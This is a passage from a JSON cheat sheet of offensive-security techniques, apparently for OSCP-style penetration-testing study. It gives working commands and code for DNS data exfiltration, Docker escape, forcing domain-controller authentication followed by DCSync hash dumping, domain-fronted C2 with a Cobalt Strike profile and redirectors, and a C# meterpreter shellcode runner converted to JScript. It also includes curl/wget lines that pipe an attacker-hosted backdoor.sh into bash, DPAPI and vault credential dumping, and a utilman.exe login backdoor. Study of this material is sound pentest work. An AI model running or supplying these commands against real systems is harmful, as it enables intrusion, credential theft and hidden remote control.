            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "DNSExfiltrator",
            "codes": [
              {
                "lang": "bash",
                "code": "# Server\npython dnsexfiltrator.py -d <YourDomain> -p <Password>\n\n# Client (PowerShell)\nInvoke-DNSExfiltrator -Domain <YourDomain> -Password <Password> -Data \"secret data\""
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Configuration",
        "substeps": [
          {
            "title": "Configure DNS Zone",
            "codes": [
              {
                "lang": "text",
                "code": "; Add to DNS zone file\ntunnel    IN    NS    ns1.yourdomain.com.\nns1       IN    A     <YourServerIP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true,
            "notes": [
              {
                "type": "note",
                "content": "Point NS record for subdomain to your server.",
                "variant": "important"
              }
            ]
          },
          {
            "title": "Test DNS Resolution",
            "codes": [
              {
                "lang": "bash",
                "code": "dig @<YourServer> test.<YourDomain>\nnslookup test.<YourDomain> <YourServer>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "dnscat2 GitHub",
        "url": "https://github.com/iagox86/dnscat2"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Encode data in DNS queries and responses. Bypass firewalls that allow DNS but block other traffic.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Linux Enumeration",
    "title": "DNS Zone Transfer",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Reverse Domain Lookup",
        "codes": [
          {
            "lang": "bash",
            "code": "dig -x <IPAddress>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Lookup",
        "codes": [
          {
            "lang": "bash",
            "code": "host <IPAddressOrHostname>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Zone Transfer (dig)",
        "codes": [
          {
            "lang": "bash",
            "code": "dig axfr <DomainName> @<DNSServerIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Zone Transfer (host)",
        "codes": [
          {
            "lang": "bash",
            "code": "host -t axfr -l <DomainName> <DNSServerIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Docker Escape",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check if Inside Container",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /proc/1/cgroup | grep docker\nls -la /.dockerenv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Docker Socket Mounted",
        "codes": [
          {
            "lang": "bash",
            "code": "ls -la /var/run/docker.sock"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Escape via Docker Socket",
        "codes": [
          {
            "lang": "bash",
            "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Documentation During Exam",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Real-Time Documentation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**What to Document:**\n- Every command executed\n- Every exploit attempted (even failures)\n- Screenshots of proof.txt and local.txt\n- Full attack path from initial access to root\n- Timestamps for everything"
          },
          {
            "type": "text",
            "content": "**Tools:**\n- CherryTree (recommended)\n- Obsidian\n- Markdown notes\n- Screenshot tool (Flameshot, Greenshot)"
          },
          {
            "type": "text",
            "content": "**Screenshot Requirements:**\n- proof.txt with `ipconfig`/`ifconfig`\n- local.txt with `ipconfig`/`ifconfig`\n- Timestamp visible in terminal"
          },
          {
            "type": "note",
            "content": "Take screenshots immediately after getting flags - don't wait.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Unconstrained Delegation",
    "title": "Domain Controller Impersonation",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Coerce DC Authentication",
        "substeps": [
          {
            "title": "SpoolSample (Print Spooler)",
            "codes": [
              {
                "lang": "bash",
                "code": "SpoolSample.exe <DC> <UnconstServer>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "PetitPotam (EFSRPC)",
            "codes": [
              {
                "lang": "bash",
                "code": "python3 PetitPotam.py <UnconstServer> <DC>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Force DC to authenticate and capture its TGT.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Use DC TGT for DCSync",
        "codes": [
          {
            "lang": "bash",
            "code": "# Import captured DC TGT\nRubeus.exe ptt /ticket:<DCBase64Ticket>\n\n# DCSync\nmimikatz.exe\nlsadump::dcsync /domain:<Domain> /user:Administrator"
          },
          {
            "lang": "bash",
            "code": "# Linux\nexport KRB5CCNAME=DC01$.ccache\nimpacket-secretsdump -k -no-pass <DC_FQDN>"
          },
          {
            "lang": "powershell",
            "code": "# Windows with Mimikatz\n.\\mimikatz.exe \"lsadump::dcsync /domain:<Domain> /all /csv\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Validate Extracted Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DC_IP> -u Administrator -H '<NTLMHash>' -d <Domain>"
          },
          {
            "lang": "bash",
            "code": "# Full domain access\nnxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Active Directory Enumeration",
    "title": "Domain Enumeration",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "Windows"
    ],
    "steps": [
      {
        "title": "Current Domain Info",
        "codes": [
          {
            "lang": "powershell",
            "code": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Controller",
        "codes": [
          {
            "lang": "bash",
            "code": "nltest /dclist:<DomainName>"
          },
          {
            "lang": "powershell",
            "code": "Get-ADDomainController"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Users",
        "codes": [
          {
            "lang": "bash",
            "code": "net user /domain"
          },
          {
            "lang": "powershell",
            "code": "Get-ADUser -Filter * | Select-Object Name,SamAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "net group /domain"
          },
          {
            "lang": "powershell",
            "code": "Get-ADGroup -Filter * | Select-Object Name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Admins",
        "codes": [
          {
            "lang": "bash",
            "code": "net group \"Domain Admins\" /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerView",
        "substeps": [
          {
            "title": "Import PowerView",
            "codes": [
              {
                "lang": "powershell",
                "code": "Import-Module .\\PowerView.ps1"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Domain Info",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-Domain"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Domain Users",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainUser | Select-Object samaccountname,description"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Local Admin Access",
            "codes": [
              {
                "lang": "powershell",
                "code": "Find-LocalAdminAccess"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Domain Computers",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainComputer | Select-Object name,operatingsystem"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Group Members",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainGroupMember -Identity \"Domain Admins\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Find Kerberoastable Users",
            "codes": [
              {
                "lang": "powershell",
                "code": "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Service Principal Names (SPNs)",
        "substeps": [
          {
            "title": "Find SPNs",
            "codes": [
              {
                "lang": "bash",
                "code": "setspn -L <ServiceAccount>"
              },
              {
                "lang": "powershell",
                "code": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Active Directory Methodology",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "After gaining initial foothold, enumerate AD to find privilege escalation paths.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Domain Fronting",
    "title": "Domain Fronting",
    "tags": [
      "Defense_Evasion",
      "Exfiltration",
      "HTTP",
      "Network"
    ],
    "steps": [
      {
        "title": "Theory",
        "substeps": [
          {
            "title": "How Domain Fronting Works",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Fronting flow:\n1. TLS connection to legitimate CDN domain (passes filters)\n2. HTTP Host header specifies attacker domain on same CDN\n3. CDN routes request to attacker based on Host header\n4. Defenders see traffic to legitimate domain, miss actual C2",
                "variant": "info"
              }
            ]
          },
          {
            "title": "Requirements",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Prerequisites:\n- CDN that routes based on Host header\n- Attacker domain on same CDN as legitimate high-reputation domain\n- C2 framework that supports domain fronting",
                "variant": "important"
              }
            ]
          },
          {
            "title": "Domain Fronting Limitations",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Limitations:\n- Many CDN providers have blocked this technique\n- Requires CDN account for attacker domain\n- SSL inspection may reveal Host header mismatch",
                "variant": "warning"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Fronting with Azure CDN",
        "substeps": [
          {
            "title": "Setup Azure CDN Profile",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true,
            "notes": [
              {
                "type": "note",
                "content": "Setup steps:\n1. Create Azure CDN endpoint pointing to C2 server\n2. Configure custom domain or use provided azureedge.net domain\n3. Configure C2 to accept connections on CDN hostname",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Cobalt Strike Malleable C2 Profile",
            "codes": [
              {
                "lang": "text",
                "code": "set sample_name \"Azure CDN Front\";\n\nhttps-certificate {\n    set CN \"*.azureedge.net\";\n}\n\nhttp-get {\n    set uri \"/api/v1/update\";\n\n    client {\n        header \"Host\" \"<YourCDNEndpoint>.azureedge.net\";\n        header \"Accept\" \"*/*\";\n    }\n}\n\nhttp-post {\n    set uri \"/api/v1/submit\";\n\n    client {\n        header \"Host\" \"<YourCDNEndpoint>.azureedge.net\";\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Test Domain Fronting",
            "codes": [
              {
                "lang": "bash",
                "code": "curl -H \"Host: <AttackerCDN>.azureedge.net\" https://www.microsoft.com/"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "CDN Setup Alternatives",
        "substeps": [
          {
            "title": "Cloudflare Workers",
            "codes": [
              {
                "lang": "javascript",
                "code": "addEventListener('fetch', event => {\n  event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n  const url = new URL(request.url)\n  url.hostname = '<C2Server>'\n  return fetch(url, request)\n}"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "AWS CloudFront",
            "codes": [
              {
                "lang": "bash",
                "code": "# Test CloudFront fronting\ncurl -H \"Host: <C2Distribution>.cloudfront.net\" https://<LegitDomain>/"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Configure CloudFront distribution with C2 as origin. Use high-reputation domain for SNI.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Redirectors",
        "substeps": [
          {
            "title": "Simple Redirector Setup",
            "codes": [
              {
                "lang": "bash",
                "code": "# socat redirector\nsocat TCP4-LISTEN:443,fork TCP4:<C2IP>:443"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true,
            "notes": [
              {
                "type": "note",
                "content": "Redirect traffic from legitimate-looking domain to C2.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Apache Mod_Rewrite Redirector",
            "codes": [
              {
                "lang": "apache",
                "code": "RewriteEngine On\nRewriteCond %{REQUEST_URI} ^/api/.*\nRewriteRule ^(.*)$ https://<C2Server>/$1 [P]\nProxyPassReverse / https://<C2Server>/"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Nginx Reverse Proxy",
            "codes": [
              {
                "lang": "nginx",
                "code": "server {\n    listen 443 ssl;\n    server_name legitimate.com;\n\n    location /api/ {\n        proxy_pass https://<C2Server>/;\n        proxy_set_header Host <C2Server>;\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Domain Fronting - Fireeye",
        "url": "https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use CDN to hide true C2 destination. Traffic appears to go to legitimate domain but routes to attacker infrastructure.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "JScript and CSharp",
    "title": "DotNetToJscript",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "Python",
      "Windows"
    ],
    "steps": [
      {
        "title": "Creating C# Shellcode Runner",
        "substeps": [
          {
            "title": "Visual Studio Project Setup",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Create Class Library (.NET Framework) project. Target .NET Framework 4.0 for compatibility.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "C# Win32 API Imports",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System;\nusing System.Runtime.InteropServices;\n\npublic class ShellcodeRunner\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Complete C# Shellcode Runner Class",
            "codes": [
              {
                "lang": "csharp",
                "code": "using System;\nusing System.Runtime.InteropServices;\n\n[ComVisible(true)]\npublic class ShellcodeRunner\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n    public ShellcodeRunner()\n    {\n        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<Port> -f csharp\n        byte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };\n\n        int size = buf.Length;\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);\n        Marshal.Copy(buf, 0, addr, size);\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n    }\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate JScript with DotNetToJscript",
        "substeps": [
          {
            "title": "Build DLL",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Compile C# project to DLL in Release mode.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Convert to JScript",
            "codes": [
              {
                "lang": "bash",
                "code": "DotNetToJscript.exe ShellcodeRunner.dll --lang=Jscript --ver=v4 -o payload.js"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Convert to VBScript",
            "codes": [
              {
                "lang": "bash",
                "code": "DotNetToJscript.exe ShellcodeRunner.dll --lang=VBScript --ver=v4 -o payload.vbs"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "JScript Shellcode Runner Output Structure",
        "codes": [
          {
            "lang": "javascript",
            "code": "// DotNetToJscript generated structure (simplified)\nvar serialized_obj = \"AAEAAAD/////...\"; // Base64 serialized assembly\nvar entry_class = \"ShellcodeRunner\";\n\n// Deserialization and instantiation logic\nvar stm = new ActiveXObject(\"System.IO.MemoryStream\");\n// ... deserialization code ...\nvar obj = assembly.CreateInstance(entry_class);"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Generated JScript deserializes and instantiates .NET object.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "DotNetToJscript GitHub",
        "url": "https://github.com/tyranid/DotNetToJscript"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Converts .NET assemblies to JScript/VBScript. Enables C# shellcode runners via script execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Pivoting with Ligolo-ng",
    "title": "Double Pivot",
    "tags": [
      "Lateral_Movement",
      "Ligolo",
      "Network",
      "Windows"
    ],
    "steps": [
      {
        "title": "Access Second Network Host",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<User>:<Pass>@<SecondPivotIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Transfer Agent to Second Pivot",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell wget http://<KaliIP>/agent.exe -o agent.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Listener for Second Agent",
        "codes": [
          {
            "lang": "text",
            "code": "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "On first session, forward port 11601 to Kali.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Run Agent on Second Pivot",
        "codes": [
          {
            "lang": "bash",
            "code": "./agent -connect <FirstPivotIP>:11601 -ignore-cert"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Add Route for Second Network",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo ip route add <SecondSubnet>/24 dev ligolo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Pivot through multiple networks by running agent on each hop.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Double-Hop Execution",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Execute on Distant Linked Server",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Enable xp_cmdshell through link chain\nEXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE'') AT [Server2]') AT [Server1]\n\n-- Execute command through chain\nEXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [Server2]') AT [Server1]"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Reverse Shells",
    "title": "Download and Execute",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Wget Script Download and Execute",
        "codes": [
          {
            "lang": "bash",
            "code": "wget -O- http://<AttackerIP>:<Port>/backdoor.sh | bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Curl Script Download and Execute",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<AttackerIP>:<Port>/backdoor.sh | bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Downloading Exposed .git Repositories",
    "tags": [],
    "steps": [
      {
        "title": "Using git-dumper",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install\npip3 install git-dumper"
          },
          {
            "lang": "bash",
            "code": "# Download entire repository\ngit-dumper http://<TargetIP>/.git/ /path/to/output"
          },
          {
            "lang": "bash",
            "code": "# Example\ngit-dumper http://10.10.10.5/.git/ ./git-dump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "git-dumper reconstructs the repository even if directory listing is disabled.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Manual Download",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create directory\nmkdir git-repo\ncd git-repo\n\n# Download .git directory\nwget -r -np -R \"index.html*\" http://<TargetIP>/.git/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Mimikatz",
    "title": "DPAPI (Data Protection API)",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump DPAPI Master Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # sekurlsa::dpapi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "DPAPI keys decrypt saved passwords in browsers, RDP credentials, etc.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Dump Windows Vault Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # vault::cred /patch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Windows Vault stores credentials for:\n- Saved RDP sessions\n- Saved network passwords\n- Web credentials",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "SSH Pivoting",
    "title": "Dynamic Port Forwarding (SOCKS Proxy)",
    "tags": [],
    "steps": [
      {
        "title": "Creating SOCKS Proxy",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP> -D 9050"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Creates a SOCKS proxy on local port 9050. All traffic sent through this port will be tunneled through the SSH connection.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "With SSH Key",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP> -i id_rsa -D 9050"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Background Process",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP> -D 9050 -f -N"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`-f` runs SSH in background, `-N` prevents command execution (just tunneling).",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Ease of Access Backdoor",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Replace utilman.exe",
        "codes": [
          {
            "lang": "bash",
            "code": "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Trigger at Login",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Click Ease of Access button at login for Command prompt as SYSTEM.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Egghunter Theory",
    "title": "Egghunter Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Egghunter",
      "Exploitation",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "When to Use Egghunters [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Egghunters solve the problem of limited buffer space:\n- **Limited Space**: Only 30-50 bytes available at EIP control point\n- **Shellcode Elsewhere**: Full shellcode exists somewhere in memory\n- **Unknown Location**: Exact address of shellcode is unknown",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Egghunter Concept [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Stage 1: Egghunter (~32 bytes)\n- Searches all memory for the egg tag\n- When found, jumps to shellcode after the egg\n\nStage 2: Full Shellcode\n- Prepended with egg tag (8 bytes: tag repeated twice)\n- Can be placed anywhere in memory (heap, stack, etc.)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Two-stage payload delivery mechanism."
          }
        ]
      },
      {
        "title": "Egg Tag Requirements [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The egg must be unique to avoid false positives:\n- **4-byte tag repeated twice**: e.g., \"w00tw00t\" (8 bytes total)\n- **Why repeated?**: Prevents egghunter from finding itself\n- **Unique value**: Should not appear naturally in memory",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Common Egg Tags",
        "codes": [
          {
            "lang": "python",
            "code": "egg = b\"w00t\"           # 0x74303077\negg = b\"HACK\"           # 0x4b434148\negg = b\"c0d3\"           # 0x33643063"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Typical tags used in egghunters."
          }
        ]
      },
      {
        "title": "Egghunter Workflow [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "1. Start at address 0x00000000 (or current location)\n2. Check if address is accessible (avoid access violations)\n3. If accessible, compare memory against egg tag\n4. If egg found (twice), jump to shellcode after egg\n5. If not found, increment address and repeat"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "How the egghunter executes."
          }
        ]
      },
      {
        "title": "Avoiding Access Violations [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Egghunter must safely check memory without crashing:\n- **System Call Method**: Use syscall to test if address is readable\n- **SEH Method**: Install exception handler to catch access violations\n- Both methods allow graceful handling of invalid memory regions",
            "variant": "info"
          }
        ]
      },
      {
